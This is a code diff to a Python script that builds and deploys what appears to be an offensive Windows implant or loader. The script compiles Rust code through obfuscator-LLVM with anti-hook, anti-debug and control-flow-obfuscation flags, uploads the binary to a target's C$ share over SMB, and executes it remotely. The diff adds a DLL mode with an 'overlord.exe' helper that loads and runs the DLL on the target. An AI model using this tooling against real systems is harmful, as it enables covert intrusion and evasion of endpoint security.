@@ -69,13 +69,21 @@ def main():
         exec_target=args.exec_target
 
     memory_options=args.mem1*' --features mem1 ' + args.mem2*' --features mem2 ' + args.mem3*' --features mem3 ' + args.mem4*' --features mem4 '
+    if args.dll:
+        dll_options="--features dll --lib"
+        dll_smb="put overlord.exe"
+        file_format="dll"
+    else:
+        dll_options=""
+        dll_smb=""
+        file_format="exe"
 
     if not args.ollvm:
-        file=f"target/x86_64-pc-windows-gnu/{mode}/{args.bin}.exe"
+        file=f"target/x86_64-pc-windows-gnu/{mode}/{args.bin}.{file_format}"
     else:
-        file=f"ollvm/x86_64-pc-windows-gnu/{mode}/{args.bin}.exe"
+        file=f"ollvm/x86_64-pc-windows-gnu/{mode}/{args.bin}.{file_format}"
     filename=os.path.basename(file)
-    filename_target=f"{args.bin}-{uuid.uuid4().hex}.exe"
+    filename_target=f"{args.bin}-{uuid.uuid4().hex}.{file_format}"
     file_target=f"/tmp/{filename_target}"
 
     log.debug(f"file={file}")
@@ -88,7 +96,7 @@ def main():
     if not args.ollvm:
         log.info("[+] NORMAL Compilation")
         # TODO enlever --features executable
-        comm=f'''cargo build --target x86_64-pc-windows-gnu --bin "{args.bin}" {comm_mode} {log_level} {memory_options} {features_loader}'''
+        comm=f'''cargo build --target x86_64-pc-windows-gnu --bin "{args.bin}" {comm_mode} {log_level} {memory_options} {features_loader} {dll_options}'''
         log.info(comm)
         compil_result=os.system(comm)
 
@@ -117,7 +125,7 @@ ACTIVATED:
 NOT ACTIVATED:
     N/A
         ''')
-        comm=f'''sudo docker run -v $(pwd):/projects/ -e LITCRYPT_ENCRYPT_KEY="$LITCRYPT_ENCRYPT_KEY" -e CARGO_TARGET_DIR=ollvm -it ghcr.io/joaovarelas/obfuscator-llvm-16.0 cargo rustc --bin "{args.bin}" --features ollvm {log_level} {memory_options} {features_loader} --target x86_64-pc-windows-gnu --release -- -Cdebuginfo=0 -Cstrip=symbols -Cpanic=abort -Copt-level=3 -Cllvm-args='-enable-acdobf -enable-antihook -enable-adb -enable-bcfobf -enable-splitobf -enable-subobf -enable-fco -enable-funcwra -enable-cffobf -enable-indibran' '''
+        comm=f'''sudo docker run -v $(pwd):/projects/ -e LITCRYPT_ENCRYPT_KEY="$LITCRYPT_ENCRYPT_KEY" -e CARGO_TARGET_DIR=ollvm -it ghcr.io/joaovarelas/obfuscator-llvm-16.0 cargo rustc --bin "{args.bin}" --features ollvm {log_level} {memory_options} {features_loader}  {features_loader} {dll_options} --target x86_64-pc-windows-gnu --release -- -Cdebuginfo=0 -Cstrip=symbols -Cpanic=abort -Copt-level=3 -Cllvm-args='-enable-acdobf -enable-antihook -enable-adb -enable-bcfobf -enable-splitobf -enable-subobf -enable-fco -enable-funcwra -enable-cffobf -enable-indibran' '''
         log.info(comm)
         compil_result=os.system(comm)
         os.system('cp -rf Cargo.lock Cargo.lock.ollvm')
@@ -126,6 +134,12 @@ NOT ACTIVATED:
     # compil_result=0 if compilation is OK
     if not compil_result:
         log.info('[+] compilation succeed')
+
+
+        if args.dll:
+            log.info("[+] compile overlord.c into overlord.exe")
+            os.system("x86_64-w64-mingw32-gcc -o overlord.exe overlord.c -L.")
+
         os.system('rm -f config/*')
         log.info(os.popen(f'ls -lah {file}').read().replace('\n',''))
         log.info(os.popen(f'file {file}').read().replace('\n',''))
@@ -141,16 +155,25 @@ NOT ACTIVATED:
 smbclient.py "{exec_target}" <<EOF
 use C$
 put {file_target}
+{dll_smb}
 ls {filename_target}
 exit
 EOF
 '''
         os.system(upload_comm)
+
         if not args.no_exec:
-            log.info(f'[+] exec c:\\{filename_target} with {args.exec_method}')
-            exec_comm=f"{args.exec_method} {exec_target} c:\\\\{filename_target}"
-            log.debug(exec_comm)
-            os.system(exec_comm)
+            if not args.dll :
+                log.info(f'[+] exec c:\\{filename_target} with {args.exec_method}')
+                exec_comm=f"{args.exec_method} {exec_target} c:\\\\{filename_target}"
+                log.debug(exec_comm)
+                os.system(exec_comm)
+            else:
+                log.info(f'[+] exec c:\\overlord.exe to load and run Overlord entrypoint of c:\\{filename_target} with {args.exec_method}')
+                exec_comm=f"{args.exec_method} {exec_target} c:\\\\overlord.exe"
+                log.debug(exec_comm)
+                os.system(exec_comm)
+
     else:
         log.info('[+] compilation failed')
         os.system('rm -f config/*')
